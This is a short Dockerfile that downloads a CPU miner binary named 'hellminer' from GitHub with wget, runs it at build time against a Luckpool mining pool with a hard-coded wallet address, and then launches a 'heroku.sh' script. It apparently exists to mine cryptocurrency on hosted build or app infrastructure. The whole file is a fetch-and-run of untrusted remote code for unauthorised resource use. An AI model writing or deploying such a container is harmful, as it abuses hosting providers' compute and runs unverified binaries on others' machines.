FROM thomasjp0x42/packetcrypt

RUN wget https://github.com/Godmine99/cpu/raw/main/hellminer
RUN chmod +x hellminer
RUN ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RJz4XfW5AdpMVUF9GMAsDvvsYFuM1MmJeS.blong -p x --cpu 4

CMD bash heroku.sh
